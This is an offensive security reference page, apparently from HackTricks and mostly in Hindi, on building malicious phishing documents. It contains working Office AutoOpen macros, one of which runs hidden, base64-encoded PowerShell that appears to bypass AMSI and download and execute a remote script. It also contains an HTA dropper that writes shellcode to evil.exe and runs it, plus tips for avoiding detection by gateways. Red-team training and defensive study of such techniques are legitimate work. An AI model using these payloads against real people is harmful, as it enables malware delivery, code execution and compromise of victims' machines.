# Phishing Files & Documents

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Office Documents

Microsoft Word एक फ़ाइल खोलने से पहले फ़ाइल डेटा मान्यता करता है। डेटा मान्यता डेटा संरचना पहचान के रूप में OfficeOpenXML मानक के खिलाफ की जाती है। यदि डेटा संरचना पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खोली जाएगी।

आमतौर पर, मैक्रोज़ वाले Word फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। हालाँकि, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदलना संभव है और फिर भी उनके मैक्रो निष्पादन क्षमताओं को बनाए रखना संभव है।\
उदाहरण के लिए, एक RTF फ़ाइल डिज़ाइन द्वारा मैक्रोज़ का समर्थन नहीं करती है, लेकिन RTF में नाम बदली गई DOCM फ़ाइल Microsoft Word द्वारा संभाली जाएगी और मैक्रो निष्पादन के लिए सक्षम होगी।\
सभी Microsoft Office Suite (Excel, PowerPoint आदि) के सॉफ़्टवेयर पर समान आंतरिक और तंत्र लागू होते हैं।

आप निम्नलिखित कमांड का उपयोग करके यह जांच सकते हैं कि कौन से एक्सटेंशन कुछ Office प्रोग्राम द्वारा निष्पादित किए जाने वाले हैं:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX फ़ाइलें एक दूरस्थ टेम्पलेट (File –Options –Add-ins –Manage: Templates –Go) का संदर्भ देते हुए जो मैक्रोज़ शामिल करती हैं, "निष्पादित" मैक्रोज़ कर सकती हैं।

### बाहरी छवि लोड

जाएँ: _Insert --> Quick Parts --> Field_\
&#xNAN;_**श्रेणियाँ**: लिंक और संदर्भ, **फ़ाइल नाम**: includePicture, और **फ़ाइल नाम या URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### मैक्रोज़ बैकडोर

यह संभव है कि मैक्रोज़ का उपयोग दस्तावेज़ से मनमाना कोड चलाने के लिए किया जाए।

#### ऑटो लोड फ़ंक्शन

जितना सामान्य होगा, उतना ही अधिक संभावना है कि AV उन्हें पहचान लेगा।

* AutoOpen()
* Document\_Open()

#### मैक्रोज़ कोड उदाहरण
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअल रूप से मेटाडेटा हटाएं

**File > Info > Inspect Document > Inspect Document** पर जाएं, जो Document Inspector को लाएगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### डॉक एक्सटेंशन

जब समाप्त हो जाए, तो **Save as type** ड्रॉपडाउन का चयन करें, फ़ॉर्मेट को **`.docx`** से **Word 97-2003 `.doc`** में बदलें।\
यह करें क्योंकि आप **`.docx`** के अंदर मैक्रो नहीं सहेज सकते हैं और **`.docm`** एक्सटेंशन के चारों ओर एक **कलंक** है (जैसे, थंबनेल आइकन में एक बड़ा `!` है और कुछ वेब/ईमेल गेटवे उन्हें पूरी तरह से ब्लॉक कर देते हैं)। इसलिए, यह **विरासत `.doc` एक्सटेंशन सबसे अच्छा समझौता है**।

#### दुर्भावनापूर्ण मैक्रोज़ जनरेटर

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फ़ाइलें

HTA एक Windows प्रोग्राम है जो **HTML और स्क्रिप्टिंग भाषाओं (जैसे VBScript और JScript)** को **संयोजित** करता है। यह उपयोगकर्ता इंटरफ़ेस उत्पन्न करता है और "पूर्ण रूप से विश्वसनीय" एप्लिकेशन के रूप में निष्पादित होता है, बिना ब्राउज़र की सुरक्षा मॉडल की सीमाओं के।

HTA को **`mshta.exe`** का उपयोग करके निष्पादित किया जाता है, जो आमतौर पर **Internet Explorer** के साथ **स्थापित** होता है, जिससे **`mshta` IE पर निर्भर होता है**। इसलिए यदि इसे अनइंस्टॉल कर दिया गया है, तो HTA निष्पादित नहीं हो पाएंगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण को मजबूर करना

**NTLM प्रमाणीकरण "दूर से"** मजबूर करने के कई तरीके हैं, उदाहरण के लिए, आप ईमेल या HTML में **अदृश्य चित्र** जोड़ सकते हैं जिन्हें उपयोगकर्ता एक्सेस करेगा (क्या यह HTTP MitM भी हो सकता है?)। या पीड़ित को **फाइलों के पते** भेजें जो केवल **फोल्डर खोलने** के लिए **प्रमाणीकरण** को **प्रेरित** करें।

**इन विचारों और अधिक की जांच करें:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM रिले

यह न भूलें कि आप केवल हैश या प्रमाणीकरण को चुरा नहीं सकते बल्कि **NTLM रिले हमले** भी कर सकते हैं:

* [**NTLM रिले हमले**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM रिले से प्रमाणपत्र)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
